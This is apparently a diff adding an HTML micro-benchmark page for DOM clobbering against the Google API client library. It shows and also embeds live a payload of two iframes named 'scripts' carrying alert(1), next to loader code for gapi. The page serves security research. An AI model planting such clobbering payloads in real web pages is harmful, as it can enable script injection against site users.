@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+</head>
+<body>
+<h1>DOM Clobbering Collection - google-client-api</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;iframe name=&quot;scripts&quot; src=&quot;https://apis.google.com/js/api.js&quot;&gt;alert(1)&lt;/iframe&gt;
+&lt;iframe name=&quot;scripts&quot; src=&quot;https://apis.google.com/js/api.js&quot;&gt;alert(1)&lt;/iframe&gt;</pre>
+  <iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
+<iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script&gt;
+    // Load the Google API client library
+    function loadGapi() {
+      const script = document.createElement(&#x27;script&#x27;);
+      script.src = &#x27;https://apis.google.com/js/api.js&#x27;;
+      script.onload = () =&gt; initGapi();
+      document.body.appendChild(script);
+    }
+
+    // Initialize the Google API client library
+    function initGapi() {
+      gapi.load(&#x27;client&#x27;, initClient);
+    }
+
+    // Set up the API client and make a request
+    function initClient() {}
+
+    // Load the additional script
+    function loadAdditionalScript() {
+      const script = document.createElement(&#x27;script&#x27;);
+      script.src = &#x27;https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs&#x27;;
+      document.body.appendChild(script);
+    }
+
+    // Initialize the loading process
+    function initialize() {
+      loadGapi();
+      loadAdditionalScript();
+    }
+  &lt;/script&gt;
+
+&lt;body onload=&quot;initialize()&quot;&gt;&lt;/body&gt;</pre>
+  <script>
+    // Load the Google API client library
+    function loadGapi() {
+      const script = document.createElement('script');
+      script.src = 'https://apis.google.com/js/api.js';
+      script.onload = () => initGapi();
+      document.body.appendChild(script);
+    }
+
+    // Initialize the Google API client library
+    function initGapi() {
+      gapi.load('client', initClient);
+    }
+
+    // Set up the API client and make a request
+    function initClient() {}
+
+    // Load the additional script
+    function loadAdditionalScript() {
+      const script = document.createElement('script');
+      script.src = 'https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs';
+      document.body.appendChild(script);
+    }
+
+    // Initialize the loading process
+    function initialize() {
+      loadGapi();
+      loadAdditionalScript();
+    }
+  </script>
+
+<body onload="initialize()"></body>
+  </div>
+</section>
+
+</body>
+</html>
